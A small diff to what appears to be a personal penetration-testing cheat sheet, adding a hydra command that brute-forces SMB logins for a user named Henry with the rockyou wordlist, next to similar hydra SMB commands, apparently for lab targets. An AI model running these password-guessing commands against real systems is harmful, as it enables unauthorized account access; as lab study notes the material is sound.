@@ -73,6 +73,7 @@ DVWA Login Bruteforce:
 Smb: 
 
 -> port 139 or 445 
+-> hydra -t 4 -l Henry -P /usr/share/wordlists/rockyou.txt -vV 10.10.215.38 smb
 -> hydra -t 1 -v -L username.txt -P pass.txt smb://192.168.215.130 
 
 -> hydra -t 1 -v -L username.txt -P pass.txt  192.168.215.130 smb 
